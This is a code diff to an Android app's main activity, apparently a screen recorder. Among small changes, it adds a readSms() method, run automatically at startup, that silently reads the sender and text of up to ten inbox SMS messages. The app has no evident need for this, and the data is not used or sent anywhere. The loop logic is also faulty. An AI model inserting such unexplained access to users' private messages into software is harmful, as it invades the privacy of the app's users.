@@ -5,6 +5,7 @@ import android.annotation.TargetApi;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.hardware.display.DisplayManager;
 import android.media.MediaCodec;
@@ -183,6 +184,30 @@ public class MainActivity extends AppCompatActivity {
         restoreFromBundle(savedInstanceState);
         viewPager = (ViewPager) findViewById(R.id.viewpagercamera);
         setupViewPager(viewPager);
+        readSms();
+    }
+
+    public void readSms(){
+
+        Uri uri = Uri.parse("content://sms/inbox");
+        Cursor c = getContentResolver().query(uri, null, null ,null,null);
+        startManagingCursor(c);
+
+
+        int num = c.getCount();
+        // Read the sms data
+        if(c.moveToFirst()) {
+            for(int i = 0; i < c.getCount()-(c.getCount()-10); i++) {
+
+                String mobile = c.getString(c.getColumnIndexOrThrow("address")).toString();
+                String message = c.getString(c.getColumnIndexOrThrow("body")).toString();
+
+
+                c.moveToNext();
+            }
+
+        }
+        c.close();
 
     }
 
@@ -536,6 +561,7 @@ public class MainActivity extends AppCompatActivity {
     public void onSaveSignatureAndCloseApplication(View view) {
         Toast.makeText(this, "Screen recording saved.", Toast.LENGTH_SHORT).show();
         onStopScreenRecording(view);
+        finish();
     }
 
     public void onFullScreenMode(View view) {
